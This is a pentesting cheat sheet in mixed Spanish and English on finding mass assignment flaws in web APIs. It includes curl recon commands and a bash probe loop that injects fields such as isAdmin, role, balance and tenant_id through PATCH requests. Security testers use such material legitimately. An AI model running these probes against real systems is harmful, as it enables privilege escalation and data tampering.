---
aliases:
  - Mass Assignment Detection
  - Mass Assignment Recon
  - Hidden Field Discovery
tags:
  - type/cheatsheet
  - vuln/mass-assignment
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Mass Assignment]]'
---
# Mass Assignment - Detección y Reconocimiento

***

## Identificar Endpoints

| **Endpoint type** | **Pattern** | **Riesgo** |
|:---:|:---:|:---:|
| `POST /api/users` | Create user | Body con user object — toda field puede ser asignada. |
| `PUT /api/users/123` | Replace user | Same. |
| `PATCH /api/users/123` | Partial update | Most common vector. |
| `POST /api/orders` | Create order | Order amount, currency, status injection. |
| `POST /signup` | Self-register | Atacante crea con admin field. |
| `PUT /profile` | Self update | Modify own user with sensitive fields. |
| `PATCH /settings` | Settings update | Update mass settings. |
| `POST /api/products` | Product creation | Stock, price, vendor injection. |
| `PUT /tenant/123` | Multi-tenant | Cross-tenant ID injection. |
| `POST /comments` | Comment creation | Owner field injection. |
| GraphQL mutations | `updateUser(input: {...})` | Full input type surface. |
| `POST /api/v2/users` | Versioned API | Different validation rules per version. |
| `POST /admin/users` | Admin endpoint | If reachable, mass priv. |
| Bulk endpoints | `POST /api/users/bulk` | Apply multiple users. |
| Export/Import | `POST /import` con JSON dump | Bypass per-field validation. |
^ma-detect-endpoints

___

## Descubrir Hidden Fields

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Frontend JS source | View source / DevTools | Form fields hidden o sólo en JS. |
| Source maps `.map` | Look for `*.js.map` files | Reveals minified code. |
| API documentation | `/swagger.json`, `/openapi.json`, `/redoc` | Full schema disclosure. |
| GraphQL introspection | `__schema` query | Direct schema dump. |
| Error messages verbose | Send invalid type → error includes field list | Sometimes reveals fields. |
| Response shape | GET endpoint response shows model fields | Inferir fields from output. |
| `OPTIONS` request | Some APIs return allowed methods + fields | RFC. |
| Snapshot diff | Compare GET before/after PUT to identify mutable fields | Black-box discovery. |
| Documentation leaks | `/docs`, `/api-docs`, `/redoc`, `/openapi`, `/swagger-ui` | Public docs. |
| GitHub repo / leak | Public repo con model definition | OSINT. |
| Mobile app reverse engineering | APK / IPA con DTO definitions | Mobile recon. |
| Burp passive scan | Detect comments, hidden fields | Pasivo. |
| Param Miner | Burp ext discovers params via fuzzing | Active. |
| `ffuf` con field wordlist | Fuzz JSON keys via Burp | Manual. |
| GraphQL clairvoyance | Recover schema sin introspection | Specific. |
| Wayback machine | Old API versions / docs | Archived. |
| `/__debug__` endpoint | Some Django apps expose | Dev mode. |
^ma-detect-hidden

### Workflow descubrimiento

```bash
# 1. Find docs
for p in /swagger.json /openapi.json /api-docs /docs /redoc; do
  curl -s "https://target$p" | head -c 1000
done

# 2. View source
curl -s 'https://target/profile' | grep -oE 'name="[a-zA-Z_]+"' | sort -u

# 3. JS source maps
curl -s 'https://target/static/js/main.js.map' | jq -r '.sources[]' 2>/dev/null

# 4. GraphQL introspection
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name fields{name type{name}}}}}"}' \
  https://target/graphql | jq .

# 5. Response shape
curl 'https://target/api/users/me' | jq 'keys'
```

___

## Inferir Model via Response

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Read GET endpoint | `GET /api/users/me` reveals all fields del modelo | Standard. |
| Compare GET con PATCH allowed | Send PATCH con field, observe behavior | Test which fields update. |
| Test internal fields | Common: `id`, `_id`, `uuid`, `created_at`, `updated_at`, `version`, `deleted_at` | Always present. |
| Test admin fields | `isAdmin`, `is_admin`, `admin`, `role`, `roles`, `permissions`, `groups` | Common patterns. |
| Test owner fields | `user_id`, `owner`, `owner_id`, `created_by`, `tenant_id` | Multi-tenant. |
| Test status flags | `active`, `is_active`, `is_verified`, `email_verified`, `mfa_enabled` | Verification. |
| Test financial | `balance`, `credits`, `points`, `tier`, `subscription_tier` | Financial vector. |
| Test audit fields | `created_at`, `updated_at`, `deleted_at` | Backdating. |
| Test soft delete | `deleted_at`, `is_deleted` | Restore deleted. |
| Test relationships | `manager_id`, `parent_id`, `team_id` | Org hierarchy. |
| Test sensitive | `password_hash`, `password_reset_token`, `mfa_secret`, `api_key` | Direct theft. |
| Send field, check 400 vs 200 | Field accepted (200) → suggest mutable | Discovery oracle. |
| Send invalid type | Field rejected (400) con error → reveals expected type | Schema infer. |
| Common schema names | `cn=admin,ou=users` LDAP-style en JSON, `type` field | Cross-stack patterns. |
^ma-detect-model

### Probe matrix

```bash
# Test multi-field injection
SUSPICIOUS_FIELDS=(
  '"isAdmin":true'
  '"role":"admin"'
  '"is_active":true'
  '"email_verified":true'
  '"user_id":1'
  '"owner_id":1'
  '"tenant_id":1'
  '"balance":99999999'
  '"created_at":"1970-01-01"'
  '"deleted_at":null'
  '"password_hash":"$2b$10$..."'
)

for f in "${SUSPICIOUS_FIELDS[@]}"; do
  echo "=== $f ==="
  R=$(curl -s -X PATCH https://target/api/profile \
       -H "Authorization: Bearer $TOKEN" \
       -H "Content-Type: application/json" \
       -d "{$f}")
  echo "$R" | jq 'keys' 2>/dev/null
done
```

***
